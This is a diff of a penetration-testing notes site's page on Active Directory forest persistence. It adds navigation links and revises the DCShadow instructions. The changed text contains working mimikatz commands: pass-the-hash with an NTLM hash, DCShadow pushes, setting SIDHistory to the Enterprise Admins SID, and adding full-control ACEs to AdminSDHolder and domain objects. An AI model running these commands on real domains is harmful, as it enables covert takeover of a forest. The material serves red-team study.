@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item current"><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -289,11 +347,15 @@
 
 <p>The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services.</p>
 
-<p>Due to the attributes are changed from a domain dontroller, there are no directory change logs on the actual DC for the target object.</p>
+<p>Due to the attributes are changed from a domain dontroller, <strong>there are no change logs on the actual DC for the target object</strong>.</p>
 
 <p>By default, domain administrative privileges are required to use DCShadow.</p>
 
 <p>To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified:</p>
+
+<ul>
+  <li>mimikatz.exe</li>
+</ul>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!</span>+
 <span class="o">!</span>processtoken
@@ -301,7 +363,9 @@ lsadump::dcshadow /object:root1user /attribute:Description /value<span class="o"
 </code></pre></div></div>
 <p>And the second one with enough privileges, such as DA, will push the values:</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /push
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+sekurlsa::pth /userAdministrator /domain:corp.local /ntlm:71d04f9d50ceb1f64de7a09f23e6dc4c /impersonate
+lsadump::dcshadow /push
 </code></pre></div></div>
 
 <blockquote>
@@ -320,11 +384,18 @@ lsadump::dcshadow /object:root1user /attribute:Description /value<span class="o"
   <p><strong>Note</strong>: This makes noise, because every one who looks <code class="highlighter-rouge">net group "Enterpise Admins" /domain</code> will see that the user user01 is a member.</p>
 </blockquote>
 
+<h2 id="change-sidhistory-of-a-user">Change SIDHistory of a user</h2>
+
+<p>We can modify the SIDHistory of a user with SID of <code class="highlighter-rouge">Enterprise Admins</code> group in order to obtain full control of the forest.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /object:user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
+</code></pre></div></div>
+
 <h2 id="modify-ntsecuritydescriptor-for-adminsdholder">Modify ntSecurityDescriptor for AdminSDHolder</h2>
 
 <p>We can modify the <code class="highlighter-rouge">ntSecurityDescriptor</code> for AdminSDHolder to add full control for a user.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=AdminADHolder,CN=System,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://CN=AdminSDHolder,CN=System,DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
 </code></pre></div></div>
 <p>We just need to append a full control ACE from above DA with our users SID.</p>
 
@@ -333,7 +404,7 @@ lsadump::dcshadow /object:root1user /attribute:Description /value<span class="o"
 Modified ACL:
 
 ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
-0:DAG:DAD:PAI<span class="o">(</span>A;;LCRPLORC;;;AU<span class="o">)</span>  .....................  <span class="o">(</span>A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323<span class="o">)</span>
+....<span class="o">(</span>A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323<span class="o">)</span>
 </code></pre></div></div>
 
 <blockquote>
@@ -344,8 +415,10 @@ ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
 
 <h2 id="shadowception">Shadowception</h2>
 
-<p>We can even run DCShadow from DCShadow. To do that task we will add 4 ACL and add the following content:</p>
+<p>We can even run DCShadow from DCShadow. To do that task we will add the following ACLs:</p>
 
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span><span class="nb">New-Object </span>System.DirectoryServices.DirectoryEntry<span class="o">(</span><span class="s2">"LDAP://DC=corp,DC=local"</span><span class="o">))</span>.psbase.ObjectSecurity.sddl
+</code></pre></div></div>
 <blockquote>
   <p><strong>Note</strong> We can use <code class="highlighter-rouge">/stack</code> to stack multiple ACL.</p>
 </blockquote>
@@ -364,7 +437,7 @@ ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
 </code></pre></div>    </div>
   </li>
   <li>Stack the ACL
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
 </code></pre></div>    </div>
   </li>
 </ul>
@@ -381,7 +454,7 @@ ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
 </code></pre></div>    </div>
   </li>
   <li>Stack the ACL
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
 </code></pre></div>    </div>
   </li>
 </ul>
@@ -398,7 +471,7 @@ ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
 </code></pre></div>    </div>
   </li>
   <li>Stack the ACL
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
 </code></pre></div>    </div>
   </li>
 </ul>
@@ -415,7 +488,7 @@ ORIGINAL ACL + FULL CONTROL <span class="k">FOR </span>OUR USER
 </code></pre></div>    </div>
   </li>
   <li>Stack the ACL
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshado /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:&lt;MODIFIED ACL&gt;
 </code></pre></div>    </div>
   </li>
 </ul>
